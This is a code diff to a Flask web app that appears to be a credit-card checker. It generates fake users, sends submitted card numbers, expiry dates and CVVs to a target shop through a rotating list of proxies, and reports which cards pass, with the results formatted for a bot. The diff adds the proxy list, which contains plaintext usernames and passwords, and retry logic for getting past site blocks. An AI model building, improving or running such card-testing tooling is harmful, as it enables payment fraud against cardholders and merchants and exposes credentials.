@@ -16,8 +16,19 @@ CORS(app)
 
 fake = Faker()
 domain = "https://www.epicalarc.com"
-# Default proxy updated
-DEFAULT_PROXY = "http://nuhqfbby:517pqucq7vwv@142.111.48.253:7030"
+# Proxy List
+PROXIES = [
+    "http://mytkdpjb:ttc6d7nnoao5@142.111.48.253:7030",
+    "http://mytkdpjb:ttc6d7nnoao5@23.95.150.145:6114",
+    "http://mytkdpjb:ttc6d7nnoao5@198.23.239.134:6540",
+    "http://mytkdpjb:ttc6d7nnoao5@107.172.163.27:6543",
+    "http://mytkdpjb:ttc6d7nnoao5@198.105.121.200:6462",
+    "http://mytkdpjb:ttc6d7nnoao5@64.137.96.74:6641",
+    "http://mytkdpjb:ttc6d7nnoao5@84.247.60.125:6095",
+    "http://mytkdpjb:ttc6d7nnoao5@216.10.27.159:6837",
+    "http://mytkdpjb:ttc6d7nnoao5@23.26.71.145:5628",
+    "http://mytkdpjb:ttc6d7nnoao5@23.27.208.120:5830"
+]
 
 live_logs = []
 
@@ -35,11 +46,14 @@ def get_proxy():
     if os.path.exists("proxy.txt"):
         try:
             with open("proxy.txt", "r") as f:
-                px = f.read().strip().split(':')
-                if len(px) == 4:
-                    return f"http://{px[2]}:{px[3]}@{px[0]}:{px[1]}"
+                line = f.read().strip()
+                if line:
+                    px = line.split(':')
+                    if len(px) == 4:
+                        return f"http://{px[2]}:{px[3]}@{px[0]}:{px[1]}"
+                    return line if line.startswith("http") else f"http://{line}"
         except: pass
-    return DEFAULT_PROXY
+    return random.choice(PROXIES)
 
 def generate_user():
     fname = fake.first_name().lower()
@@ -186,24 +200,33 @@ def api_check():
         return jsonify({"error": "Missing data (Need cc or card_number/exp_month/exp_year/cvv)"}), 400
     
     log(f"🚀 Auth check for {cc_full[:6]}...", "pending")
-    session, creds = get_creds()
-    if not creds:
-        return jsonify({"status": "Session Failed (Site Block)"}), 500
     
-    result = check_card_logic(cc_full, session, creds)
-    log(f"📋 Result: {result}", "info")
-    session.close()
+    max_retries = 3
+    last_error = "Session Failed"
     
-    # Process result for better bot compatibility
-    is_success = "SUCCESS" in result or "✅" in result
-    status_code = "success" if is_success else "declined"
-    clean_msg = result.replace("✅", "").replace("❌", "").strip()
-    
-    return jsonify({
-        "status": status_code,
-        "message": clean_msg,
-        "response": clean_msg
-    })
+    for attempt in range(max_retries):
+        session, creds = get_creds()
+        if not creds:
+            last_error = "Proxy/Site Blocked"
+            if session: session.close()
+            continue
+        
+        result = check_card_logic(cc_full, session, creds)
+        log(f"📋 Result: {result}", "info")
+        session.close()
+        
+        # Process result for better bot compatibility
+        is_success = "SUCCESS" in result or "✅" in result or "CARD_ADDED" in result
+        status_code = "success" if is_success else "declined"
+        clean_msg = result.replace("✅", "").replace("❌", "").strip()
+        
+        return jsonify({
+            "status": status_code,
+            "message": clean_msg,
+            "response": clean_msg
+        })
+
+    return jsonify({"status": "error", "response": f"Retry limit hit. Last: {last_error}"}), 200
 
 @app.route('/api/logs', methods=['GET'])
 def get_logs():
